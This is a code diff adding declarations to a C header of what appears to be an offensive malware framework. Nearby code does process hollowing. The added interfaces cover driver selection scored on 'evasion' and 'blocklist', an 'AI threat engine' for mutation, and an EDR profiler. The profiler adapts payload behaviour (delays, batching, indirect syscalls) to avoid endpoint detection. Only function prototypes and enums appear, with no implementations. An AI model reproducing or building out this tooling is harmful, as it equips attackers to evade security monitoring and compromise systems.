@@ -659,6 +659,86 @@ uint32_t jocky_spawn_hollow_linux(const char* target_path, const void* payload, 
 
 #endif /* !_WIN32 */
 
+/* ============================================================================
+ * AI Threat Engine: Adaptive threat assessment and mutation strategies
+ * ============================================================================ */
+
+/* Risk levels for threat assessment */
+typedef enum {
+    JOCKY_RISK_LOW = 0,
+    JOCKY_RISK_MEDIUM = 1,
+    JOCKY_RISK_HIGH = 2,
+    JOCKY_RISK_CRITICAL = 3,
+} jocky_risk_level_t;
+
+/* Initialize AI threat engine with embedded model data */
+bool jocky_ai_init(void);
+
+/* Get current threat level based on telemetry */
+uint32_t jocky_ai_get_threat_level(void);
+
+/* ============================================================================
+ * Driver Intelligence: Multi-tier scoring and fallback chains
+ * ============================================================================ */
+
+/* Score a driver across multiple dimensions (evasion, prevalence, capability, blocklist)
+ * Returns composite score (0-100)
+ */
+int jocky_driver_score_composite(const char* driver_name);
+
+/* Select best driver from manifest based on required capabilities
+ * Returns driver name string, or NULL if no suitable driver found
+ */
+const char* jocky_driver_select_best(uint32_t required_capabilities);
+
+/* Get fallback chain for driver selection
+ * Attempts drivers in order of descending quality score
+ * Returns array of driver names, caller must free
+ */
+const char** jocky_driver_get_fallback_chain(uint32_t required_capabilities, int* out_count);
+
+/* ============================================================================
+ * EDR Profiler: Dynamic EDR detection and adaptive payload behavior
+ * ============================================================================ */
+
+#ifdef _WIN32
+
+/* Adaptive behavior modes based on EDR detection */
+typedef enum {
+    JOCKY_EDR_STEALTH = 0,      /* Maximum evasion: delays, batching, indirect syscalls */
+    JOCKY_EDR_NORMAL = 1,       /* Balanced operation */
+    JOCKY_EDR_AGGRESSIVE = 2,   /* Rapid exploitation, no delays */
+} jocky_edr_mode_t;
+
+/* Initialize EDR profiler to detect active monitoring
+ * Returns profile handle, or NULL on failure
+ */
+void* jocky_edr_profiler_init(void);
+
+/* Record an EDR callback detection
+ * Used to track callback frequency and estimate EDR behavior
+ */
+void jocky_edr_profiler_record_callback(void* profiler);
+
+/* Analyze collected EDR callback data and return detection state
+ * Returns edr_mode_t indicating recommended adaptive strategy
+ */
+jocky_edr_mode_t jocky_edr_profiler_analyze(void* profiler);
+
+/* Get recommended syscall delay based on EDR profile (milliseconds) */
+uint32_t jocky_edr_get_syscall_delay(jocky_edr_mode_t mode);
+
+/* Check if payload should reduce syscall frequency */
+bool jocky_edr_should_reduce_syscalls(jocky_edr_mode_t mode);
+
+/* Check if payload should batch multiple operations */
+bool jocky_edr_should_batch_operations(jocky_edr_mode_t mode);
+
+/* Shutdown EDR profiler and save profile for next execution */
+void jocky_edr_profiler_shutdown(void* profiler);
+
+#endif /* _WIN32 */
+
 #ifdef __cplusplus
 }
 #endif
